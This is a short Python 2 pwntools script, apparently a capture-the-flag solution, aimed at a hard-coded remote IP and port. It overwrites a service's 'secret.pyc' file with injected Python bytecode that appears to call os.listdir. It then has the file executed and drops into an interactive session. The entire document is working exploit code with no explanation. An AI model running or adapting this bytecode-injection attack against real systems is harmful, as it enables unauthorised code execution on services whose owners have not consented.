from pwn import *
context.arch = "amd64"

host = '35.201.132.60'
port = 12000
#host = 'localhost'
#port = 6666
r = remote(host, port)
#r = process('./xxx')

pyc = "03f30d0ac2af595a6300000000000000000200000040000000731e0000006400006401006c00005a00006500006a0100640200830100474864010053280300000069ffffffff4e74010000002e280200000074020000006f7374070000006c697374646972280000000028000000002800000000730500000078642e707974080000003c6d6f64756c653e0100000073020000000c01"
pyc = pyc[20:]

r.recvuntil(':')
r.sendline('cbd')
r.recvuntil(':')
r.sendline('0')
r.recvuntil(':')
r.sendline('secret.pyc')
res = r.recvuntil(':').split('\n')[0].strip()
payload = res + pyc
r.sendline('1')
r.recvuntil(':')
r.sendline('secret.pyc')
r.recvuntil(':')
r.sendline(payload)
r.recvuntil(':')
r.sendline('2')
print r.recvuntil(':')
r.sendline('6'*64)

r.interactive()
